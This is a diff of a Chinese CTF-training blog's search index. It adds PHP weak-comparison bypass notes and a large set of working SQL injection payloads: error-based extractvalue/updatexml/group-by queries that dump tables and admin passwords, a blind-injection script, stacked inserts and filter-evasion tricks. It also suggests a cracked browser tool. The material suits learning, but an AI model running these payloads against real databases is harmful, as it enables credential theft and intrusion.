@@ -91,6 +91,34 @@
       </tags>
   </entry>
   <entry>
+    <title>hackbar</title>
+    <url>/2024/07/13/hackbar/</url>
+    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>in_array</title>
+    <url>/2024/07/13/in-array/</url>
+    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
+<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>is_numberic</title>
     <url>/2024/07/13/is-numberic/</url>
     <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
@@ -110,19 +138,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hackbar</title>
-    <url>/2024/07/13/hackbar/</url>
-    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>intval</title>
     <url>/2024/07/12/intval/</url>
     <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
@@ -133,21 +148,6 @@
 
 <h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
 <h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>in_array</title>
-    <url>/2024/07/13/in-array/</url>
-    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
-<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -212,6 +212,23 @@
       </tags>
   </entry>
   <entry>
+    <title>php入门</title>
+    <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
+<h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><p>&emsp;&emsp;也是生怕你们不看，单拎出来给你们了解一下 ( ੭ ˙ᗜ˙ )੭<br>&emsp;&emsp;GET方法，嗯……不知道怎么描述，直接看示例就知道了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;像是$_GET[‘id’]这样的，里面的参数就是变量，代表有个变量id可以通过URL?的形式进行传参，例如<strong><a href="http://127.0.0.1/?id=1">http://127.0.0.1?id=1</a></strong>,这样id的值就为1。</p>
+<h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><p>&emsp;&emsp;和GET差不多，但传参的方式变了，像是你在网页输入的信息就是用的POST，如果没有你能点的或者输入的东西，就要用到hackbar了，什么，你不知道hackbar是什么？点这个了解一下吧：<a href="/2024/07/13/hackbar/">hackbar</a></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp; 知道这两个方法之后，恭喜你，能做出大部分的web题目了，遇到不会的就去网上搜和问AI，web主要靠得是你的信息收集能力，加油吧，师傅们ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>preg_match</title>
     <url>/2024/06/12/preg-match/</url>
     <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
@@ -254,23 +271,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php入门</title>
-    <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
-<h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><p>&emsp;&emsp;也是生怕你们不看，单拎出来给你们了解一下 ( ੭ ˙ᗜ˙ )੭<br>&emsp;&emsp;GET方法，嗯……不知道怎么描述，直接看示例就知道了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;像是$_GET[‘id’]这样的，里面的参数就是变量，代表有个变量id可以通过URL?的形式进行传参，例如<strong><a href="http://127.0.0.1/?id=1">http://127.0.0.1?id=1</a></strong>,这样id的值就为1。</p>
-<h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><p>&emsp;&emsp;和GET差不多，但传参的方式变了，像是你在网页输入的信息就是用的POST，如果没有你能点的或者输入的东西，就要用到hackbar了，什么，你不知道hackbar是什么？点这个了解一下吧：<a href="/2024/07/13/hackbar/">hackbar</a></p>
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp; 知道这两个方法之后，恭喜你，能做出大部分的web题目了，遇到不会的就去网上搜和问AI，web主要靠得是你的信息收集能力，加油吧，师傅们ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>preg_replace</title>
     <url>/2024/07/12/preg-replace/</url>
     <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
@@ -288,6 +288,18 @@
       </categories>
       <tags>
         <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>print&amp;print_r</title>
+    <url>/2024/07/13/print-print-r/</url>
+    <content><![CDATA[<p>&emsp;&emsp;print()只能打印出简单类型变量的值（如int,string），输出一个字符串。<br>&emsp;&emsp;print_r()可以打印出复杂类型变量的值（如数组，对象），打印关于变量的易于理解的信息。通常打比赛的时候经常使用的是它。<br>&emsp;&emsp;建议实践，方便理解。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>区别</tag>
       </tags>
   </entry>
   <entry>
@@ -342,7 +354,22 @@
 <p>&emsp;&emsp;照着修改一下即可。剩下的也是一样的，测长和字符的形式是一样，我就例举两个就行。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag, url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;) or ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">            data[<span class="string">&quot;uname&quot;</span>] = payload</span><br><span class="line">            response = requests.post(url,data=data).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;数据库名为&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br></pre></td></tr></table></figure>
 
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3>]]></content>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>&emsp;&emsp;第十七关是一个密码重置界面，用户名已经找到，密码不知道，这一题还对用户名进行了检查，就只能对密码入手，如果布尔盲注和时间盲注都不能使用，就可以使用报错注入。就直接给固定公式了，原理可以再去搜索一下。</p>
+<h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,version(),<span class="number">0x5c</span>)))<span class="meta">#    爆版本</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>)))<span class="meta">#   爆数据库</span></span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">0x5c</span>)))<span class="meta">#   爆表名</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>),<span class="number">0x5c</span>)))<span class="meta"># </span></span><br><span class="line"> 爆字段名</span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> password <span class="title">from</span> (<span class="params"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username=<span class="string">&#x27;admin1&#x27;</span></span>) b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。</span></span><br><span class="line"><span class="function">1&#x27; <span class="title">and</span> (<span class="params">extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(username,password</span>) <span class="keyword">from</span> users),0x5c)))#                      爆字段内容。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,version(),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#     爆版本</span></span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#    爆数据库</span></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#      爆表名</span></span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name =<span class="string">&#x27;users&#x27;</span>),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line">   爆字段名</span><br><span class="line"> </span><br><span class="line"><span class="number">123&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> password <span class="title">from</span> (<span class="params"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username=<span class="string">&#x27;admin1&#x27;</span></span>) b),0x5c),1))#</span></span><br><span class="line"><span class="function">爆密码该格式针对mysql数据库。</span></span><br><span class="line"><span class="function">爆其他表就可以，下面是爆emails表</span></span><br><span class="line"><span class="function">123&#x27; <span class="title">and</span> (<span class="params">updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name =<span class="string">&#x27;emails&#x27;</span>),<span class="number">0x5c</span>),<span class="number">1</span>))<span class="meta">#</span></span><br><span class="line"> </span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">and</span> (updatexml (<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">id,email_id</span>) <span class="keyword">from</span> emails),0x5c),1))#   爆字段内容。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h4><figure class="highlight q"><table><tr><td class="code"><pre><span class="line"><span class="number">123</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> concat(database(),<span class="number">0x5c</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#     爆数据库</span><br><span class="line"><span class="number">123</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> concat(version(),<span class="number">0x5c</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#      爆数据库版本</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    通过修改limit后面数字一个一个爆表</span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#        爆出所有表</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">and</span> table_name=&#x27;users&#x27;),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    爆出所有字段名</span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username,password) <span class="keyword">from</span> users),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))#    爆出所有字段名</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">group</span> <span class="keyword">by</span> concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="built_in">where</span> username=&#x27;admin1&#x27;),<span class="number">0x7e</span>,<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))a)#    爆出该账户的密码。</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p> &emsp;&emsp;至此大多数的sql注入方法，还有一个堆叠注入，像是这样的用法<code>login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login</code>，这个简单去了解一下即可。下面是一些特殊情况的绕过。</p>
+<h3 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h3><p> &emsp;&emsp;很常用的方法，双写穿插。<br> <figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">or</span>     --&gt;</span> oorr</span><br><span class="line"><span class="function"><span class="title">and</span>    --&gt;</span> aandnd</span><br><span class="line"><span class="function"><span class="title">union</span>  --&gt;</span> uunionnion</span><br><span class="line"><span class="function"><span class="title">select</span> --&gt;</span> seselectlect</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p> &emsp;&emsp;在实战中，这种方法并不常见了<br> <figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">or</span>     --&gt;</span> Or</span><br><span class="line"><span class="function"><span class="title">select</span> --&gt;</span> SEleCt</span><br><span class="line"><span class="function"><span class="title">union</span>  --&gt;</span> UniOn</span><br><span class="line"><span class="function"><span class="title">and</span>    --&gt;</span> aND</span><br></pre></td></tr></table></figure></p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p> &emsp;&emsp;很常见的一种，也很烦，在每一个空格处替换,报错注入使用空格比较少，也可使用此方法。<br> <figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">09</span></span> TAB键（水平）</span><br><span class="line"><span class="tag">%<span class="selector-tag">0a</span></span> 换行</span><br><span class="line"><span class="tag">%<span class="selector-tag">0c</span></span> 换页</span><br><span class="line"><span class="tag">%<span class="selector-tag">0d</span></span> return功能</span><br><span class="line"><span class="tag">%<span class="selector-tag">0b</span></span> TAB键（垂直）</span><br><span class="line"><span class="tag">%<span class="selector-tag">20</span></span>,%a0,+ 空格</span><br></pre></td></tr></table></figure></p>
+<h3 id="逻辑运算符绕过"><a href="#逻辑运算符绕过" class="headerlink" title="逻辑运算符绕过"></a>逻辑运算符绕过</h3><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">and</span> --&gt;</span> &amp;&amp;</span><br><span class="line"><span class="function"><span class="title">or</span>  --&gt;</span> ||</span><br></pre></td></tr></table></figure>
+
+<h3 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h3><p> &emsp;&emsp;当斜杠，单引号和双引号过滤或者转义的时候，我们可以采用宽字节绕过。当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。也就是全角和半角。</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>&emsp;&emsp;很常见的绕过手段了，十六进制编码就行。</p>
+]]></content>
       <categories>
         <category>WEB</category>
       </categories>
@@ -351,15 +378,15 @@
       </tags>
   </entry>
   <entry>
-    <title>print&amp;print_r</title>
-    <url>/2024/07/13/print-print-r/</url>
-    <content><![CDATA[<p>&emsp;&emsp;print()只能打印出简单类型变量的值（如int,string），输出一个字符串。<br>&emsp;&emsp;print_r()可以打印出复杂类型变量的值（如数组，对象），打印关于变量的易于理解的信息。通常打比赛的时候经常使用的是它。<br>&emsp;&emsp;建议实践，方便理解。</p>
+    <title>信息收集（CTF基础篇）</title>
+    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
